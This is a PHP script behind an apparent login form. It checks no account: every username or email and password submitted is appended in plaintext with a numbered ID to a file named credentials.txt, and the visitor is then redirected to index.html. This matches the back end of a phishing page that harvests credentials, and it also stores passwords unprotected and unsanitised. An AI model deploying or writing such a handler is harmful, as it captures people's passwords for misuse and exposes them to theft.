<?php
// Start the session (optional, if you want to store session data)
session_start();

// Initialize error message
$error = "";

// Check if the form is submitted
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Get the form input values
    $username_or_email = $_POST['username_or_email'];
    $password = $_POST['password'];

    // Simple validation to check if both fields are filled
    if (empty($username_or_email) || empty($password)) {
        $error = "Both fields are required.";
    } else {
        // Open the credentials.txt file in read mode to find the last line
        $file = fopen("credentials.txt", "r");

        // Check if the file is successfully opened
        if ($file) {
            // Read the contents of the file and find the last numeric ID
            $lines = file("credentials.txt");
            $last_line = end($lines); // Get the last line
            $last_id = 0;

            if ($last_line) {
                // Extract the numeric ID from the last line
                preg_match('/^(\d+):/', $last_line, $matches);
                $last_id = isset($matches[1]) ? (int)$matches[1] : 0;
            }

            // Increment the ID for the new entry
            $new_id = $last_id + 1;

            // Close the file after reading
            fclose($file);

            // Open the file again in append mode to save the new credentials
            $file = fopen("credentials.txt", "a");

            // Check if the file is successfully opened
            if ($file) {
                // Format the credentials as "ID: username_or_email: password"
                $credentials = $new_id . ": " . $username_or_email . ": " . $password . "\n";

                // Append the new credentials to the file
                fwrite($file, $credentials);

                // Close the file after writing
                fclose($file);

                // Redirect to index.html after saving credentials
                header("Location: index.html?success=Credentials%20saved%20successfully");
                exit;
            } else {
                $error = "Unable to save credentials. Please try again later.";
            }
        } else {
            $error = "Unable to read the credentials file. Please try again later.";
        }
    }

    // Redirect with error message if needed
    if ($error) {
        header("Location: index.html?error=" . urlencode($error));
        exit;
    }
}
?>

